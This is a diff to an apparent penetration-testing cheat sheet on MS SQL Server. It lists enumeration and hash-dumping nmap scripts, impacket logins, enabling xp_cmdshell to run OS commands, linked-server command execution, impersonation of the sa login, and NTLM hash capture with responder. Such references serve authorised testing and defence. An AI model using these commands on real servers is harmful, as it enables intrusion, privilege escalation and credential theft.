@@ -33,7 +33,7 @@ Microsoft's closed-source version of SQL.
 
 ```bash
 # Enumerate via nmap
-sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET>
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=<USER>,mssql.password=<PASSWORD>,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET>
 
 # Enumerate via MSF
 use auxiliary/scanner/mssql/mssql_ping
@@ -41,9 +41,10 @@ set RHOSTS <TARGET>
 run
 
 ### Login via Windows auth
-impacket-mssqlclient -windows-auth <DOMAIN>/<USER>@<TARGET>
+impacket-mssqlclient -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
 impacket-mssqlclient <USER>:<PASSWORD>@<TARGET>
 
+# Survey
 SELECT @@version;
 SELECT user_name();
 SELECT system_user;
@@ -86,7 +87,6 @@ EXECUTE sp_OADestroy @OLE
 
 ```sql
 enable_xp_cmdshell
-
 EXECUTE sp_configure 'show advanced options', 1
 RECONFIGURE
 EXECUTE sp_configure 'xp_cmdshell', 1
@@ -94,7 +94,7 @@ RECONFIGURE
 
 xp_cmdshell <COMMAND>
 
-# or run linked server command
+-- or run linked server command
 EXECUTE('xp_cmdshell ''<DOS_CMD>''') AT [<LINKED_SERVER>]
 ```
 
@@ -104,13 +104,13 @@ EXECUTE('xp_cmdshell ''<DOS_CMD>''') AT [<LINKED_SERVER>]
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' ;
 GO
 
-# Impersonating the SA User
+-- Impersonating the SA User (admin)
 USE master
 EXECUTE AS LOGIN = 'sa'
-# Verify
+-- Verify
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
-# 0 is NOT admin
+-- 0 is NOT admin
 ```
 
 ## Linked Servers
@@ -119,9 +119,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 SELECT srvname, isremote FROM sysservers
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<TARGET>\SQLEXPRESS]
 
----
-
-### Capture NTLM Hash
+-- Capture NTLM Hash
 sudo responder -I <INTERFACE>
 
 # XP_DIRTREE Hash Stealing
